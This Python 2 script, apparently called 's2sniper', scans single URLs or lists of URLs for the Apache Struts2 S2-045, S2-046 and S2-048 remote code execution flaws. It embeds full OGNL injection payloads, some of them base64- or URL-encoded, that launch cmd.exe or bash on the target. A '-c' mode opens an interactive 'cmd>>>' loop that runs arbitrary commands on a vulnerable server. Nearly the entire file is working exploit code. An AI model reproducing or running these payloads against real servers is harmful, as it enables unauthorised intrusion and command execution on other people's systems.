#coding:utf-8
#Author:LSA
#Description:struts2 series bugs batch check 
#Date:20170830

import requests
import sys
import urllib
import urllib2
import base64
import optparse
import os
import datetime
import Queue
import threading

lock = threading.Lock()


happy = 0

q0 = Queue.Queue()

threadlist = []

s045 = 0
s046 = 0
s048 = 0

result = {}


def poc045(url,nowtime):
	
	#--------------------st2-045--------------------------------------------------
	headers = {}
	headers["User-Agent"] = 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11'
	
	command = 'echo helloworld9870123'
	payload045 = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    	headers["Content-Type"] = payload045
	try:
	
    		r0 = requests.get(url, headers=headers)
	except Exception as e:
		if w2f==0:
			result['st2-045'] = 'st2-045 attack error!'
			print 'st2-045 attack error!'
		return -1

    	if "helloworld9870123" in r0.content:
		global happy
		happy = 1

		if w2f:
			lock.acquire()
			global s045
			s045 = s045 + 1
			f045 = open("result/" + nowtime + "/st2-045-vuln.txt","a")
			f045.write(url)
			f045.flush()
			f045.close()
			lock.release()
		else:
			result['st2-045'] = 'st2-045 vulnerable'
			print 'st2-045 vulnerable!!!'

	#--------------------------------------------------------------------------------


def poc046(url,nowtime):
	#---------------------------st2-046------------------------------------------
	headers = {}
	command = 'echo helloworld9870123'
	payload_l = base64.decodestring(u'JXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2VzKCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigjY21kPSc=')
        payload_r = base64.decodestring(u'JykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfQ==')
        end_null_byte = '0063'.decode('hex')
        payload046 = payload_l + command + payload_r + end_null_byte
	
	user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)'
        header_payload = 'multipart/form-data; boundary=---------------------------735323031399963166993862150'
        headers = {'User-Agent': user_agent,
               'Content-Type': header_payload}
        body_payload = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name="foo"; filename="{0}"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--'''.format(payload046) 
 	try:
		
        	req = urllib2.Request(url, headers=headers,data=body_payload)
        	response = urllib2.urlopen(req)
		r1 = response.read()
	except Exception as e:
		if w2f==0:
			result['st2-046'] = 'st2-046 attack error'
            		print 'st2-046 attack error!'
		return -1
        if 'helloworld9870123' in r1:
		global happy
		happy = 1

		if w2f:	
			lock.acquire()	
			global s046
			s046 = s046 + 1
			f046 = open("result/" + nowtime + "/st2-046-vuln.txt","a")
			f046.write(url)
			f046.flush()
			f046.close()
			lock.release()
		else:
			result['st2-046'] = 'st2-046 vulnerable'
			print 'st2-046 vulnerable!!!'
	#---------------------------------------------------------------------------------


def poc048(url,nowtime):
	#------------------------st2-048----------------------------------
	cmd = urllib.quote('echo helloworld9870123') 
    	payload048 = "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27"+cmd+"%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=996&__cheackbox_bustedBefore=true&description=hello"
    	try:
        	req = urllib2.urlopen(url, payload048)
        	r2 = req.read()
        	
    	except Exception as e:
		if w2f==0:
			result['st2-048'] = 'st2-048 attack error'
			print 'st2-048 attack error!'
        	return -1

	if 'helloworld9870123' in r2:
		global happy
		happy = 1

		if w2f:
			lock.acquire()
			global s048
			s048 = s048 + 1
			f048 = open("result/" + nowtime + "/st2-048-vuln.txt","a")
			f048.write(url)
			f048.flush()
			f048.close()
			lock.release()
		else:
			result['st2-048'] = 'st2-048 vulnerable'
			print 'st2-048 vulnerable!!!'		

        	
	#--------------------------------------------------------------------------------



def execpoc(nowtime,url=""):
	global countlines
	while (not q0.empty()):            #batch
		
		theUrl = q0.get()
		qcount = q0.qsize()
		print 'checking ' + theUrl + '---[' +  str(countlines - qcount) + '/' + str(countlines) + ']'
		poc045(theUrl,nowtime)
		poc046(theUrl,nowtime)
		poc048(theUrl,nowtime)

#---------------------------------------------------------

	else:                         #single
		poc045(url,nowtime)
		poc046(url,nowtime)
		poc048(url,nowtime)
	
	if happy == 0 and w2f == 0:
		result['st2-all'] = 'Nothing'
		print 'Unlucky!Nothing!'

#------------------------------------logger----------------------------------------

def logger(nowtime1,operation,result,usedtime):
	today = datetime.datetime.now().strftime('%Y%m%d')
	flog = open("log/" + today + ".txt","a")
	formatResult = ""
	for key in result:
		formatResult = formatResult + key + ": " + str(result[key]) + "\n"	

	flog.writelines("\nLaunched time: " + nowtime1 + "\nOperation: " + operation + "\nResult:\n" + formatResult + "Used time: " + str(usedtime) + "s\n--------------------------------------------------------------")
	flog.flush()
	flog.close()
#----------------------------------------------------------------------------------


#-----------------------------------batch statistics--------------------------------------

def statistics():
	global countlines
	print '##############Statistics#################'
	print 'Total ' + str(countlines) + ' urls'
	print 'st2-045 : ' + str(s045)
	print 'st2-046 : ' + str(s046)
	print 'st2-048 : ' + str(s048)

	print '#########################################'
	
#----------------------------------------------------------------------------------

if __name__ == '__main__':
	
	global w2f
	w2f = 0
	
	#stime = datetime.datetime.now()

	stime = datetime.datetime.now()
	nowtime = stime.strftime('%Y%m%d%H%M%S')
	nowtime1 = stime.strftime('%Y-%m-%d %H:%M:%S')
	print '*************s2sniper launched in ' + nowtime1 + '***************'	

	parser = optparse.OptionParser('python %prog '+\
      	   '-h <manual>')
    	parser.add_option('-u', dest='tgtUrl', type='string',\
      	   help='input target url')
    	parser.add_option('-f', dest='tgtFilepath', type='string',\
           help='input a filepath about urls')
    	parser.add_option('-t', dest='threads', type='int', default=5,\
           help='input a threads num')
	parser.add_option('-c', dest='pld', type='str',\
           help='input payload number <045/046/048>')


    
    	(options, args) = parser.parse_args()

    	tgtUrl = options.tgtUrl

	tgtFilepath = options.tgtFilepath

	threads = options.threads

	pld = options.pld

	if (pld and tgtUrl) and (tgtFilepath is None):
		if pld == '045':	
			while True:
				command = raw_input("cmd>>> ")
				if command == 'exit':
					sys.exit()
				payload045 = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" 
				headers = {'Content-Type':payload045}
				cmdResult = requests.get(tgtUrl,headers=headers)
				print cmdResult.text
				
		if pld == '046':	
			while True:
				command = raw_input("cmd>>> ")
				if command == 'exit':
					sys.exit()
				headers = {}
	
				payload_l = base64.decodestring(u'JXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2VzKCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigjY21kPSc=')
        			payload_r = base64.decodestring(u'JykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfQ==')
        			end_null_byte = '0063'.decode('hex')
        			payload046 = payload_l + command + payload_r + end_null_byte
	
				user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)'
        			header_payload = 'multipart/form-data; boundary=---------------------------735323031399963166993862150'
        			headers = {'User-Agent': user_agent,
               				'Content-Type': header_payload}
        			body_payload = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name="foo"; filename="{0}"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--'''.format(payload046) 
        			cmdResult = requests.get(tgtUrl, headers=headers,data=body_payload)
				print cmdResult.text
		if pld == '048':
			while True:
				command = raw_input("cmd>>> ")
				if command == 'exit':
					sys.exit()
				payload048 = "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27"+command+"%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=996&__cheackbox_bustedBefore=true&description=hello"
    	
        			cmdResult = requests.get(tgtUrl,payload048)
        			
				print cmdResult.text
				
				
		
		
	else:
	
		if(tgtUrl and (tgtFilepath is None) and (pld is None)):
			operation = '-u ' + tgtUrl
			execpoc(nowtime,tgtUrl)

		else:
			if(tgtFilepath and (tgtUrl is None) and (pld is None)):
				if threads != 5:
					operation = '-f ' + tgtFilepath + ' -t ' + str(threads)
				else:
					operation = '-f ' + tgtFilepath

				stime = datetime.datetime.now()
				os.mkdir("result/"+nowtime)
				w2f = 1
				urlsFile = open(tgtFilepath)
				global countlines
				countlines = len(open(tgtFilepath,'rU').readlines())

				print '===Total ' + str(countlines) + ' urls==='

				for urls in urlsFile:
				
					q0.put(urls)
			
			
				for thread in range(threads):
					t = threading.Thread(target=execpoc,args=(nowtime,))
					t.start()
					threadlist.append(t)
				for th in threadlist:
					th.join()

				result = {'st2-045':s045,'st2-046':s046,'st2-048':s048}
				statistics()
			
			else:	
				parser.print_help()
	

	etime = datetime.datetime.now()
	
	usedtime = (etime - stime).seconds

	logger(nowtime1,operation,result,usedtime)

	print 'Total used ' + str(usedtime) + 's'	

	print '********************************************************************'

	

	

	
	
    
